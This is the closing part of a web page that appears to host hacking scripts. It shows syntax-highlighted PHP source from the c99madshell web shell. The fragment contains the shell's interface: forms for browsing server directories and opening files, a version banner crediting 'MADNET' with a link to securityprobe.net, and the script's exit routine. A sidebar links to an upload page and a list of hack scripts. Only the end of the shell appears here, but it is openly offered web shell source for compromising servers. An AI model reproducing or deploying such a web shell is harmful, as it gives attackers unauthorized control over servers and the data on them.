class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$wdt</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;br&amp;gt;&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=&quot;1&quot; width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;:: Go Dir ::&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;ls&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;d&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=&quot;Go&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;:: Go File ::&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;gofile&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;f&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=&quot;Go&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;br&amp;gt;&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;990&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;--[ c99madshell v. </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$shver</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;a href=&quot;#&quot; OnClick=&quot;document.todo.act.value=&#39;about&#39;;document.todo.submit();&quot;&amp;gt;&amp;lt;u&amp;gt; EDITED BY &amp;lt;/b&amp;gt;&amp;lt;b&amp;gt;MADNET&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt; &amp;lt;/a&amp;gt;| &amp;lt;a href=&quot;http://securityprobe.net&quot;&amp;gt;&amp;lt;font color=&quot;#FF0000&quot;&amp;gt;http://securityprobe.net&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;font color=&quot;#FF0000&quot;&amp;gt;&amp;lt;/font&amp;gt; | Generation time: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nx">starttime</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"> ]--&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;</span><span class="cp">&lt;?php</span> <span class="nb">chdir</span><span class="p">(</span><span class="nv">$lastdir</span><span class="p">);</span> <span class="nx">c99shexit</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
